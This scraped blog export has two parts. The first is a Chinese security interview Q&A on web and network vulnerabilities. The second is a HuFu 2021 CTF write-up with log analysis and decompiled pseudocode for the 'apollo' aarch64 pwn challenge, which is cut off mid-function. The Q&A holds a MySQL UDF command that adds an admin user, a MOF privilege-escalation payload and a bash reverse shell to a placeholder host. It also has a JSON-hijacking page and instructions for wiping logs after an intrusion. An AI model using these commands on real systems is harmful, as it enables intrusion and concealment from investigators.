形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。\n检测SSRF漏洞的验证方法：\n1）因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞\n2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为 www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞 4\nSSRF漏洞的成因 防御 绕过成因：模拟服务器对其他服务器资源进行请求，没有做合法性验证。 利用：构造恶意内网IP做探测，或者使用其余所支持的协议对其余服务进行攻击。 防御：禁止跳转，限制协议，内外网限制，URL限制。 绕过：使用不同协议，针对IP，IP格式的绕过，针对URL，恶意URL增添其他字符，@之类的。301跳转+dns rebindding。\n上传文件上传漏洞原理由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致用户可以越过其本身权限向服务器上传可执行的动态脚本文件\n常见的上传绕过方式\n前端js验证：禁用js&#x2F;burp改包\n大小写\n双重后缀名\n过滤绕过 pphphp-&gt;php\n\n防护\n文件上传目录设置为不可执行\n使用白名单判断文件上传类型\n用随机数改写文件名和路径\n\n审查上传点的元素有什么意义？有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。\n文件包含原理引入一段用户能控制的脚本或代码，并让服务器端执行 （1）include()等函数通过动态变量的方式引入需要包含的文件； （2）用户能够控制该动态变量。\n导致文件包含的函数PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfile(), … JSP&#x2F;Servlet：ava.io.File(), java.io.Fil-eReader(), … ASP：include file, include virtual,\n本地文件包含能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞\nXXE逻辑漏洞金融行业常见逻辑漏洞单针对金融业务的 主要是数据的篡改(涉及金融数据，或部分业务的判断数据)，由竞争条件或者设计不当引起的薅羊毛，交易&#x2F;订单信息泄露，水平越权对别人的账户查看或恶意操作，交易或业务步骤绕过。\n溢出中间人攻击中间人攻击是一个（缺乏）相互认证的攻击；由于客户端与服务器之间在SSL握手的过程中缺乏相互认证而造成的漏洞\n防御中间人攻击的方案通常基于一下几种技术\n1.公钥基础建设PKI 使用PKI相互认证机制，客户端验证服务器，服务器验证客户端；上述两个例子中都是只验证服务器，这样就造成了SSL握手环节的漏洞，而如果使用相互认证的的话，基本可以更强力的相互认证\n2.延迟测试\n使用复杂加密哈希函数进行计算以造成数十秒的延迟；如果双方通常情况下都要花费20秒来计算，并且整个通讯花费了60秒计算才到达对方，这就能表明存在第三方中间人。\n3.使用其他形式的密钥交换形式\nARP欺骗原理:每台主机都有一个ARP缓存表，缓存表中记录了IP地址与MAC地址的对应关系，而局域网数据传输依靠的是MAC地址。 在ARP缓存表机制存在一个缺陷，就是当请求主机收到ARP应答包后，不会去验证自己是否向对方主机发送过ARP请求包，就直接把这个返回包中的IP地址与MAC地址的对应关系保存进ARP缓存表中，如果原有相同IP对应关系，原有的则会被替换。这样攻击者就有了偷听主机传输的数据的可能\n防护1.在主机绑定网关MAC与IP地址为静态（默认为动态），命令：arp -s 网关IP 网关MAC\n2.在网关绑定主机MAC与IP地址\n3.使用ARP防火墙\nDDOSDdos原理利用合理的请求造成资源过载，导致服务不可用\nsyn洪流的原理伪造大量的源IP地址，分别向服务器端发送大量的SYN包，此时服务器端会返回SYN&#x2F;ACK包，因为源地址是伪造的，所以伪造的IP并不会应答，服务器端没有收到伪造IP的回应，会重试3～5次并且等待一个SYNTime（一般为30秒至2分钟），如果超时则丢弃这个连接。攻击者大量发送这种伪造源地址的SYN请求，服务器端将会消耗非常多的资源（CPU和内存）来处理这种半连接，同时还要不断地对这些IP进行SYN+ACK重试。最后的结果是服务器无暇理睬正常的连接请求，导致拒绝服务。\nCC攻击原理对一些消耗资源较大的应用页面不断发起正常的请求，以达到消耗服务端资源的目的。\nDDOS防护SYN Cookie&#x2F;SYN Proxy、safereset等算法。SYN Cookie的主要思想是为每一个IP地址分配一个“Cookie”，并统计每个IP地址的访问频率。如果在短时间内收到大量的来自同一个IP地址的数据包，则认为受到攻击，之后来自这个IP地址的包将被丢弃。\n提权mysql两种提权方式udf提权,mof提权\nMysql_UDF提权要求: 1.目标系统是Windows(Win2000,XP,Win2003)； 2.拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数 3.有root账号密码 导出udf: MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\\plugin文件夹下才能创建自定义函数 可以再mysql里输入 select @@basedir show variables like ‘%plugins%’ 寻找mysql安装路径 提权:\n使用SQL语句创建功能函数。语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname ‘导出的DLL路径’；\ncreate function cmdshell returns string soname ‘udf.dll’select cmdshell(‘net user arsch arsch /add’);select cmdshell(‘net localgroup administrators arsch /add’);drop function cmdshell;\n\n该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建lib\\plugin文件夹，然后将udf.dll文件导出到该目录即可。\nMysql mof提权#pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;)instance of __EventFilter as $EventFilter&#123;EventNamespace = &quot;Root\\\\Cimv2&quot;;Name  = &quot;filtP2&quot;;Query = &quot;Select * From __InstanceModificationEvent &quot;&quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot;&quot;And TargetInstance.Second = 5&quot;;QueryLanguage = &quot;WQL&quot;;&#125;;instance of ActiveScriptEventConsumer as $Consumer&#123;Name = &quot;consPCSV2&quot;;ScriptingEngine = &quot;JScript&quot;;ScriptText =&quot;var WSH = new ActiveXObject(\\&quot;WScript.Shell\\&quot;)\\nWSH.run(\\&quot;net.exe user waitalone waitalone.cn /add\\&quot;)&quot;;&#125;;instance of __FilterToConsumerBinding&#123;Consumer   = $Consumer;Filter = $EventFilter;&#125;;\n\n其中的第18行的命令，上传前请自己更改。\n2、执行load_file及into dumpfile把文件导出到正确的位置即可。\nselect load file(&#x27;c:/wmpub/nullevt.mof&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/nullevt.mov&#x27;\n\n执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接之就ok了。\n特殊漏洞Struts2-045Redis未授权访问产生原因Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器\n利用条件和方法条件:\n\nredis服务以root账户运行\nredis无密码或弱密码进行认证\nredis监听在0.0.0.0公网上\n\n方法:\n\n通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫\n上传SSH公钥获得SSH登录权限\n通过crontab反弹shell\nslave主从模式利用\n\n修复\n密码验证\n降权运行\n限制ip&#x2F;修改端口\n\nJenkins未授权访问攻击者通过未授权访问进入脚本命令执行界面执行攻击指令\nprintln &quot;ifconfig -a&quot;.execute().text 执行一些系统命令,利用wget下载webshell\nMongoDB未授权访问开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。\n防护1、为MongoDB添加认证： 1)MongoDB启动时添加–auth参数 2)给MongoDB添加用户： use admin #使用admin库 db.addUser(“root”, “123456”) #添加用户名root密码123456的用户 db.auth(“root”,“123456”) #验证下是否添加成功，返回1说明成功 2、禁用HTTP和REST端口 MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface&#x3D;false 3、限制绑定IP 启动时加入参数 –bind_ip 127.0.0.1 或在&#x2F;etc&#x2F;mongodb.conf文件中添加以下内容： bind_ip &#x3D; 127.0.0.1\nMemcache未授权访问Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。\n利用1、登录机器执行netstat -an |more命令查看端口监听情况。回显0.0.0.0:11211表示在所有网卡进行监听，存在memcached未授权访问漏洞。\n2、telnet 11211，或nc -vv 11211，提示连接成功表示漏洞存在\n漏洞加固\n1、设置memchached只允许本地访问\n2、禁止外网访问Memcached 11211端口\n3、编译时加上–enable-sasl，启用SASL认证\n\nFFMPEG 本地文件读取漏洞原理通过调用加密API将payload加密放入一个会被执行的段字节中。但是具体回答工程中我只回答道了SSRF老洞，m3u8头，偏移量，加密。\n安全知识WEB常用WEB开发JAVA框架STRUTS,SPRING 常见的java框架漏洞 其实面试官问这个问题的时候我不太清楚他要问什么，我提到struts的045 048，java常见反序列化。 045 错误处理引入了ognl表达式 048 封装action的过程中有一步调用getstackvalue递归获取ognl表达式 反序列化 操作对象，通过手段引入。apache common的反射机制、readobject的重写，其实具体的我也记不清楚。。。然后这部分就结束了\n同源策略同源策略限制不同源对当前document的属性内容进行读取或设置。 不同源的区分：协议、域名、子域名、IP、端口，以上有不同时即不同源。\nJsonp安全攻防技术，怎么写Jsonp的攻击页面？涉及到Jsonp的安全攻防内容JSON劫持、Callback可定义、JSONP内容可定义、Content-type不为json。\n攻击页面JSON劫持，跨域劫持敏感信息，页面类似于\nfunction wooyun(v)&#123;alert(v.username);&#125;&lt;/script&gt;&lt;script src=&quot;http://js.login.360.cn/?o=sso&amp;m=info&amp;func=wooyun&quot;&gt;&lt;/script&gt;\n\nContent-type不正确情况下，JSONP和Callback内容可定义可造成XSS。 JSONP和FLASH及其他的利用参照知道创宇的JSONP安全攻防技术。\nPHPphp中命令执行涉及到的函数1，代码执行：eval()、assert()、popen()、system()、exec()、shell_exec()、passthru(),pcntl_exec(),call_user_func_array(),create_function() 2，文件读取：file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等 3，命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()\n安全模式下绕过php的disable fuctionDL函数，组件漏洞，环境变量。\nPHP弱类型== 在进行比较的时候，会先将字符串类型转化成相同，再比较\n如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行\n0e开头的字符串等于0\n数据库各种数据库文件存放的位置mysql:/usr/local/mysql/data/ C:\\ProgramData\\MySQL\\MySQL Server 5.6\\Data\\ oracle:$ORACLE_BASE/oradata/$ORACLE_SID/\n系统如何清理日志meterpreter: clearev\n入侵 Linux 服务器后需要清除哪些日志？web日志，如apache的access.log,error.log。 直接将日志清除过于明显,一般使用sed进行定向清除\ne.g. sed -i -e ‘&#x2F;192.169.1.1&#x2F;d’\nhistory命令的清除，也是对~&#x2F;.bash_history进行定向清除\nwtmp日志的清除，&#x2F;var&#x2F;log&#x2F;wtmp\n登录日志清除 &#x2F;var&#x2F;log&#x2F;secure\nLINUX查看当前端口连接的命令有哪些？netstat 和 ss 命令的区别和优缺点netstat -antp` `ss -l\n\nss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。\n反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么?bash -i&gt;&amp;/dev/tcp/x.x.x.x/4444 0&gt;&amp;1\n\n通过Linux系统的&#x2F;proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？ls /proc\n\n系统信息，硬件信息，内核版本，加载的模块，进程\nlinux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。/etc/ssh/sshd___config iptables配置\n如何一条命令查看文件内容最后一百行tail -n 100 filename\n\nWindows如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。密码学AES／DES的具体工作步骤RSA算法加密: $$ 密文＝明文^EmodN $$ RSA加密是对明文的E次方后除以N后求余数的过程\n$$ 公钥＝(E,N) $$ 解密:\n$$ 明文＝密文^DmodN $$ $$ 私钥＝(D,N) $$ 三个参数n,e1,e2\nn是两个大质数p,q的积\n分组密码的加密模式如何生成一个安全的随机数？引用之前一个学长的答案，可以通过一些物理系统生成随机数，如电压的波动、磁盘磁头读&#x2F;写时的寻道时间、空中电磁波的噪声等。\nSSL握手过程建立TCP连接、客户端发送SSL请求、服务端处理SSL请求、客户端发送公共密钥加密过的随机数据、服务端用私有密钥解密加密后的随机数据并协商暗号、服务端跟客户端利用暗号生成加密算法跟密钥key、之后正常通信。 这部分本来是忘了的，但是之前看SSL Pinning的时候好像记了张图在脑子里，挣扎半天还是没敢确定，遂放弃。。。\n对称加密与非对称加密的不同，分别用在哪些方面TCP&#x2F;IPTCP三次握手的过程以及对应的状态转换（1）客户端向服务器端发送一个SYN包，包含客户端使用的端口号和初始序列号x;（2）服务器端收到客户端发送来的SYN包后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认号xx1和服务器端的初始序列号y;（3）客户端收到服务器端返回的SYNSACK报文后，向服务器端返回一个确认号为yy1、序号为xx1的ACK报文，一个标准的TCP连接完成。\nTCP和UDP协议区别tcp面向连接,udp面向报文 tcp对系统资源的要求多 udp结构简单 tcp保证数据完整性和顺序，udp不保证\nhttps的建立过程\n客户端发送请求到服务器端\n服务器端返回证书和公开密钥，公开密钥作为证书的一部分而存在\n客户端验证证书和公开密钥的有效性，如果有效，则生成共享密钥并使用公开密钥加密发送到服务器端\n服务器端使用私有密钥解密数据，并使用收到的共享密钥加密数据，发送到客户端\n客户端使用共享密钥解密数据\nSSL加密建立\n\n流量分析wireshark简单的过滤规则过滤ip:\n过滤源ip地址:ip.src==1.1.1.1;,目的ip地址:ip.dst==1.1.1.1;\n过滤端口:\n过滤80端口:tcp.port==80,源端口:tcp.srcport==80,目的端口:tcp.dstport==80\n协议过滤:\n直接输入协议名即可,如http协议http\nhttp模式过滤:\n过滤get&#x2F;post包http.request.mothod==&quot;GET/POST&quot;\n防火墙简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。\n转载请注明出处谢谢！\n\n","categories":["security"],"tags":["interview"]},{"title":"虎符网络安全大赛之零解","url":"/2021/04/05/security/ctf/compitation/wp-hf-2021/","content":"Hu Fu 2021 Online 之零解Intro这次比赛一个都没做出来，菜～，这篇文章主要重新复现一下没做出来的PWN题，这次比赛既然把两个区块链的题放入了PWN中，我们队伍也没人去研究那玩意儿，以后有时间可以去了解一下。。。这次主要还是WEB输出高，REVERSE也不错，我菜得抠脚QAQ。\nMisc你会分析日志吗通过分析日志，发现请求长度有两个399和377，都是采用sql注入，将日志中sleep函数前面的一个数字提取出来即可。\n192.168.52.156 - - [11/Mar/2021:18:04:27 +0000] &quot;GET /index.php?id=1&#x27;%20and%20if(ord(substr((select%20flag%20from%20flllag),34,1))=83,sleep(2),1)--+ HTTP/1.1&quot; 200 399 &quot;-&quot; &quot;python-requests/2.21.0&quot;\n\n这里也就是83\n通过提取长度为377请求中的数字，执行命令进行提取\ncat access.log| grep &quot;377&quot; | grep &quot;select%20flag%20from%20flllag&quot; | tr -d &quot;a-z()[]\\&quot;&#x27;/A-Z %.+?-&quot; |  awk -F &#x27;=&#x27; &#x27;&#123;print $3 &#125;&#x27; | cut -d &#x27;,&#x27; -f 1 | tr &quot;\\n&quot; &quot;,&quot;\n\n或\ncat access.log| grep &quot;377&quot; | grep &quot;select%20flag%20from%20flllag&quot; | cut -d &#x27;=&#x27; -f 3 | cut -d &#x27;,&#x27; -f 1 | tr &quot;\\n&quot; &quot;,&quot;\n\n输出如下\n90,109,120,104,90,51,116,90,98,51,86,102,89,88,74,108,88,51,78,118,88,50,100,121,90,87,70,48,102,81,61,61,\n\na = [90,109,120,104,90,51,116,90,98,51,86,102,89,88,74,108,88,51,78,118,88,50,100,121,90,87,70,48,102,81,61,61]for i in a:\tprint(chr(i), end=&#x27;&#x27;)\n\n打印出该字符为: ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ&#x3D;&#x3D;\nbase64进行解密: \necho &quot;ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==&quot; | base64 -d flag&#123;You_are_so_great&#125;\n\n\n\nPWNPWN逆了半天，调试了半天。。。逻辑都没进入，一个字菜～。这次PWN题基本算是VM类型的，grira没办法把某些代码反编译，IDA虽然能反编译汇编，但是伪代码还是存在不能完全反编译。aarch64指令又难看，ememme~。另一个题我看了下，感觉也跟这个差不多，然后我也没很细的看那道题，继续分析apollo，下午太困了，搞不出来，睡觉～～～。这次比赛采用跳转表，只能看汇编动态分析，c伪代码根本不知道在干啥玩意儿！\napollohinthint1: 附件补充aarch64库，同时此题的难点在于vm虚拟机的分析。 https://pan.baidu.com/s/1_RgBNGCBzJeBqlFKDBV0xg 提取码：GAME。\nhint2: 漏洞点在于车辆前方的绿灯或红灯的转化，使车辆到达了地图外\n各个函数伪c代码如下\nmain 函数int __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v3; // w0  const char **v4; // x1  const char **v5; // x2  init_();  v3 = logo();  run(v3, v4, v5);  return 0;&#125;\n\nrun 函数int __cdecl run(int argc, const char **argv, const char **envp)&#123;  int v4; // [xsp+18h] [xbp+18h]  input_ptr = (__int64)malloc(0x1000uLL);  if ( !input_ptr )    puts(&quot;Init fail!&quot;);  printf(&quot;cmd&gt; &quot;);  read(0, (void *)input_ptr, 0x1000uLL);  parse();  return v4 ^ _stack_chk_guard;&#125;\n\nparse函数void sub_E14()&#123;  _QWORD v0[12]; // [xsp+58h] [xbp+58h]  v0[0] = func_0;  v0[1] = func_1[0];  v0[2] = func_2[0];  v0[3] = func_3[0];  v0[4] = func_4[0];  v0[5] = func_5[0];  v0[6] = func_6[0];  v0[7] = func_7[0];  v0[8] = func_8[0];  v0[9] = func_9;  v0[10] = func_a;  v0[11] = func_b;  __asm &#123; BR              X0 &#125;&#125;\n\nmul_1018函数void mul_1018()&#123;  __int64 v0; // x29  int v1; // w19  if ( enter_flag )  &#123;    *(_DWORD *)(v0 + 48) = *(unsigned __int8 *)(*(_QWORD *)(v0 + 72) + 1LL);// var_1 = *(opcode_ptr + 1)    *(_DWORD *)(v0 + 52) = *(unsigned __int8 *)(*(_QWORD *)(v0 + 72) + 2LL);// var_2 = *(opcode_ptr + 2)    *(_DWORD *)(v0 + 60) = *(unsigned __int8 *)(*(_QWORD *)(v0 + 72) + 3LL);// var_3 = *(opcode_ptr + 3)    *(_DWORD *)(v0 + 64) = *(unsigned __int8 *)(*(_QWORD *)(v0 + 72) + 4LL);// var_4 = *(opcode_ptr + 4)    *(_DWORD *)(v0 + 68) = *(_DWORD *)(v0 + 60) + (*(_DWORD *)(v0 + 64) &lt;&lt; 8);// size = var_4 * 0x10 + var_3    if ( *(_DWORD *)(v0 + 48) &lt; size_l          // check (var_1 &lt; size_l &amp;&amp; var_2 &lt; size_r)      &amp;&amp; *(_DWORD *)(v0 + 52) &lt; size_r      &amp;&amp; !*(_BYTE *)(buf_1 + size_r * *(_DWORD *)(v0 + 48) + *(_DWORD *)(v0 + 52))// *(buf_1 + size_r * var_1 + var_2) == 0      &amp;&amp; *(int *)(v0 + 68) &gt; 0                  // check (size &gt; 0 &amp;&amp; size &lt;= 0x600)      &amp;&amp; *(int *)(v0 + 68) &lt;= 0x600 )    &#123;      *(_BYTE *)(buf_1 + size_r * *(_DWORD *)(v0 + 48) + *(_DWORD *)(v0 + 52)) = 1;// *(buf_1 + size_r * var_1 + var_2) = 1, malloc_flag      v1 = size_r * *(_DWORD *)(v0 + 48) + *(_DWORD *)(v0 + 52);// v1 = size_r * var_1 + var_2      *((_QWORD *)&amp;ptr_ + v1) = malloc(*(int *)(v0 + 68));// *(ptr + size_r * var_1 + var_2) =  malloc(size)      read(0, *((void **)&amp;ptr_ + size_r * *(_DWORD *)(v0 + 48) + *(_DWORD *)(v0 + 52)), *(int *)(v0 + 68));// read(0, *(ptr + size_r * var_1 + var_2), size)      *(_QWORD *)(v0 + 72) += 5LL;              // opcode ptr += 5      JUMPOUT(0xED0LL);                         // jump table    &#125;    JUMPOUT(0x256CLL);                          // abort  &#125;  puts(&quot;Abort&quot;);  exit(255);&#125;\n\n\n\ndiv_11f4void div_11F4()&#123;  __int64 v0; // x29  if ( enter_flag )  &#123;                                             // just tack two param    *(_DWORD *)(v0 + 48) = *(unsigned __int8 *)(*(_QWORD *)(v0 + 72) + 1LL);// var_1 = *(opcode_ptr + 1)    *(_DWORD *)(v0 + 52) = *(unsigned __int8 *)(*(_QWORD *)(v0 + 72) + 2LL);// var_2 = *(opcode_ptr + 2)    if ( *(_DWORD *)(v0 + 48) &lt; size_l          // check (var_1 &lt; size_l &amp;&amp; var_2 &lt; size_r)      &amp;&amp; *(_DWORD *)(v0 + 52) &lt; size_r      &amp;&amp; *(_BYTE *)(buf_1 + size_r * *(_DWORD *)(v0 + 48) + *(_DWORD *)(v0 + 52)) == 1// check malloc flag      &amp;&amp; *((_QWORD *)&amp;ptr_ + size_r * *(_DWORD *)(v0 + 48) + *(_DWORD *)(v0 + 52)) )// check buf is not null    &#123;      free(*((void **)&amp;ptr_ + size_r * *(_DWORD *)(v0 + 48) + *(_DWORD *)(v0 + 52)));// free(buf);      *((_QWORD *)&amp;ptr_ + size_r * *(_DWORD *)(v0 + 48) + *(_DWORD *)(v0 + 52)) = 0LL;// buf=0;      *(_BYTE *)(buf_1 + size_r * *(_DWORD *)(v0 + 48) + *(_DWORD *)(v0 + 52)) = 0;// set malloc flag as 0      *(_QWORD *)(v0 + 72) += 3LL;              // opcode_ptr +=3      JUMPOUT(0xED0LL);    &#125;    JUMPOUT(0x256CLL);  &#125;  puts(&quot;Abort&quot;);  exit(255);&#125;\n\nplus_1394void plus_1394()&#123;  __int64 v0; // x29  if ( enter_flag )  &#123;    *(_DWORD *)(v0 + 48) = *(unsigned __int8 *)(*(_QWORD *)(v0 + 72) + 1LL);// var_1 = *(opcode_ptr + 1)    *(_DWORD *)(v0 + 52) = *(unsigned __int8 *)(*(_QWORD *)(v0 + 72) + 2LL);// var_2 = *(opcode_ptr + 2)    *(_DWORD *)(v0 + 56) = *(unsigned __int8 *)(*(_QWORD *)(v0 + 72) + 3LL);// var_3 = *(opcode_ptr + 3)    if ( *(_DWORD *)(v0 + 48) &lt; size_l          // check (var_1 &lt; size_l &amp;&amp; var_2 &lt; size_r)      &amp;&amp; *(_DWORD *)(v0 + 52) &lt; size_r      &amp;&amp; !*(_BYTE *)(buf_1 + size_r * *(_DWORD *)(v0 + 48) + *(_DWORD *)(v0 + 52))// *(buf_1 + size_r * var_1 + var_2) != 0      &amp;&amp; *(int *)(v0 + 56) &gt; 1                  // check (var_1 &gt; 1  &amp;&amp; var_2 &lt;= 4)      &amp;&amp; *(int *)(v0 + 56) &lt;= 4 )    &#123;      *(_BYTE *)(buf_1 + size_r * *(_DWORD *)(v0 + 48) + *(_DWORD *)(v0 + 52)) = *(_DWORD *)(v0 + 56);// *(buf_1 + size_r * var_1 + var_2) = var_3      *(_QWORD *)(v0 + 72) += 4LL;              // opcode ptr += 4      JUMPOUT(0xED0LL);    &#125;    JUMPOUT(0x256CLL);  &#125;  puts(&quot;Abort&quot;);  exit(255);&#125;\n\n\n\n_sub_14d4void sub_14D4()&#123;  __int64 v0; // x29  if ( enter_flag )  &#123;    *(_DWORD *)(v0 + 48) = *(unsigned __int8 *)(*(_QWORD *)(v0 + 72) + 1LL);// var_1 = *(opcode_ptr + 1)    *(_DWORD *)(v0 + 52) = *(unsigned __int8 *)(*(_QWORD *)(v0 + 72) + 2LL);// var_2 = *(opcode_ptr + 2)    if ( *(_DWORD *)(v0 + 48) &lt; size_l          // check (var_1 &lt; size_l &amp;&amp; var_2 &lt; size_r)      &amp;&amp; *(_DWORD *)(v0 + 52) &lt; size_r      &amp;&amp; *(unsigned __int8 *)(buf_1 + size_r * *(_DWORD *)(v0 + 48) + *(_DWORD *)(v0 + 52)) &gt; 1u      &amp;&amp; *(unsigned __int8 *)(buf_1 + size_r * *(_DWORD *)(v0 + 48) + *(_DWORD *)(v0 + 52)) &lt;= 4u )// check (var_1 &gt; 1  &amp;&amp; var_2 &lt;= 4)    &#123;      *(_BYTE *)(buf_1 + size_r * *(_DWORD *)(v0 + 48) + *(_DWORD *)(v0 + 52)) = 0;// *(buf_1 + size_r * var_1 + var_2) = 0      *(_QWORD *)(v0 + 72) += 3LL;              // opcode ptr += 3      JUMPOUT(0xED0LL);    &#125;    JUMPOUT(0x256CLL);  &#125;  puts(&quot;Abort&quot;);  exit(255);&#125;\n\n\n\n\n\nw_1620void w_1620()&#123;  __int64 v0; // x29  char v1; // w0  if ( enter_flag )  &#123;    if ( vertical &gt; 0      &amp;&amp; *(_BYTE *)(base_ + (vertical - 1) * size_r + horizontal) != 1      &amp;&amp; *(_BYTE *)(base_ + (vertical - 1) * size_r + horizontal) != 4 )    &#123;      *(_BYTE *)(base_ + vertical * size_r + horizontal) = 0;      if ( *(_BYTE *)(base_ + (vertical - 1) * size_r + horizontal) )      &#123;        if ( *(_BYTE *)(base_ + (vertical - 1) * size_r + horizontal) == 2          || *(_BYTE *)(base_ + (vertical - 1) * size_r + horizontal) == 3 )        &#123;          *(_BYTE *)(base_ + (vertical - 2) * size_r + horizontal) = 5;          vertical -= 2;        &#125;      &#125;      else      &#123;        *(_BYTE *)(base_ + --vertical * size_r + horizontal) = 5;      &#125;    &#125;    v1 = dword_14080++;    *(_BYTE *)(qword_14090 + vertical * size_r + horizontal) = v1;    ++*(_QWORD *)(v0 + 72);                     // opcode_ptr ++    JUMPOUT(0xED0LL);  &#125;  puts(&quot;Abort&quot;);  exit(255);&#125;\n\n\n\ns_1990void s_1990()&#123;  __int64 v0; // x29  char v1; // w0  if ( enter_flag )  &#123;    if ( size_l - 1 &gt; vertical      &amp;&amp; *(_BYTE *)(base_ + (vertical + 1) * size_r + horizontal) != 1      &amp;&amp; *(_BYTE *)(base_ + (vertical + 1) * size_r + horizontal) != 4 )    &#123;      *(_BYTE *)(base_ + vertical * size_r + horizontal) = 0;      if ( *(_BYTE *)(base_ + (vertical + 1) * size_r + horizontal) )      &#123;        if ( *(_BYTE *)(base_ + (vertical + 1) * size_r + horizontal) == 2          || *(_BYTE *)(base_ + (vertical + 1) * size_r + horizontal) == 3 )        &#123;          *(_BYTE *)(base_ + (vertical + 2) * size_r + horizontal) = 5;          vertical += 2;        &#125;      &#125;      else      &#123;        *(_BYTE *)(base_ + ++vertical * size_r + horizontal) = 5;      &#125;    &#125;    v1 = dword_14080++;    *(_BYTE *)(qword_14090 + vertical * size_r + horizontal) = v1;    ++*(_QWORD *)(v0 + 72);                     // opcode_ptr ++    JUMPOUT(0xED0LL);  &#125;  puts(&quot;Abort&quot;);  exit(255);&#125;\n\n\n\n\n\na_1d10void a_1d10()&#123;  __int64 v0; // x29  char v1; // w0  if ( enter_flag )  &#123;    if ( horizontal &gt; 0      &amp;&amp; *(_BYTE *)(base_ + vertical * size_r + horizontal - 1LL) != 1      &amp;&amp; *(_BYTE *)(base_ + vertical * size_r + horizontal - 1LL) != 4 )    &#123;      *(_BYTE *)(base_ + vertical * size_r + horizontal) = 0;      if ( *(_BYTE *)(base_ + vertical * size_r + horizontal - 1LL) )      &#123;        if ( *(_BYTE *)(base_ + vertical * size_r + horizontal - 1LL) == 2          || *(_BYTE *)(base_ + vertical * size_r + horizontal - 1LL) == 3 )        &#123;          *(_BYTE *)(base_ + vertical * size_r + horizontal - 2LL) = 5;          horizontal -= 2;        &#125;      &#125;      else      &#123;        *(_BYTE *)(base_ + vertical * size_r + horizontal-- - 1LL) = 5;      &#125;    &#125;    v1 = dword_14080++;    *(_BYTE *)(qword_14090 + vertical * size_r + horizontal) = v1;    ++*(_QWORD *)(v0 + 72);                     // opcode_ptr ++    JUMPOUT(0xED0LL);                           // loop jump  &#125;  puts(&quot;Abort&quot;);  exit(255);&#125;\n\n\n\nd_2080void d_2080()&#123;  __int64 v0; // x29  char v1; // w0  if ( enter_flag )  &#123;    if ( size_r - 1 &gt; horizontal      &amp;&amp; *(_BYTE *)(base_ + vertical * size_r + horizontal + 1LL) != 1      &amp;&amp; *(_BYTE *)(base_ + vertical * size_r + horizontal + 1LL) != 4 )    &#123;      *(_BYTE *)(base_ + vertical * size_r + horizontal) = 0;      if ( *(_BYTE *)(base_ + vertical * size_r + horizontal + 1LL) )      &#123;        if ( *(_BYTE *)(base_ + vertical * size_r + horizontal + 1LL) == 2          || *(_BYTE *)(base_ + vertical * size_r + horizontal + 1LL) == 3 )        &#123;          *(_BYTE *)(base_ + vertical * size_r + horizontal + 2LL) = 5;          horizontal += 2;        &#125;      &#125;      else      &#123;        *(_BYTE *)(base_ + vertical * size_r + horizontal++ + 1LL) = 5;      &#125;    &#125;    v1 = dword_14080++;    *(_BYTE *)(qword_14090 + vertical * size_r + horizontal) = v1;    ++*(_QWORD *)(v0 + 72);                     // opcode_ptr ++    JUMPOUT(0xED0LL);                           // abort  &#125;  puts(&quot;Abort&quot;);  exit(255);&#125;\n\nprint_2400void print_2400()&#123;  __int64 v0; // x29  if ( enter_flag )  &#123;    *(_DWORD *)(v0 + 36) = 0;    for ( *(_DWORD *)(v0 + 36) = 0; *(_DWORD *)(v0 + 36) &lt; size_l * size_r - 1; ++*(_DWORD *)(v0 + 36) )    &#123;      *(_DWORD *)(v0 + 40) = *(_DWORD *)(v0 + 36) / size_r;      *(_DWORD *)(v0 + 44) = *(_DWORD *)(v0 + 36) - size_r * *(_DWORD *)(v0 + 40);      if ( *(_BYTE *)(base_ + *(int *)(v0 + 36)) == 1 )      &#123;        